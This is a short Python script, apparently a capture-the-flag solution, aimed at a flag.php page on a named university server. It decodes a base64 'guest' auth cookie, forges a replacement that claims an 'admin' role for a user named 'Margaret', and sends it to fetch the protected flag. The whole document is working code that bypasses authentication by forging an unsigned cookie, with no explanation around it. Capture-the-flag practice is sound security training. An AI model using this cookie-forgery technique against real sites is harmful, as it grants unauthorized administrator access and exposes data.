import base64
import json
import requests 

url = "http://ccug.gunadarma.ac.id:2930/flag.php"

auth_guest = "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QifQ"

missing_padding = len(auth_guest) % 4
if missing_padding:
    auth_guest += "=" * (4 - missing_padding)

decoded_guest = base64.b64decode(auth_guest).decode('utf-8')
print(f"Decoded guest auth: {decoded_guest}")

admin_data = {
    "user": "Margaret",
    "role": "admin"
}

auth_admin = base64.b64encode(json.dumps(admin_data).encode('utf-8')).decode('utf-8')
print(f"Generated admin auth: {auth_admin}")

cookies = {"auth": auth_admin}
response = requests.get(url, cookies=cookies)

if response.status_code == 200:
    print("Response from server:")
    print(response.text)
else:
    print(f"Failed to get response. Status code: {response.status_code}")
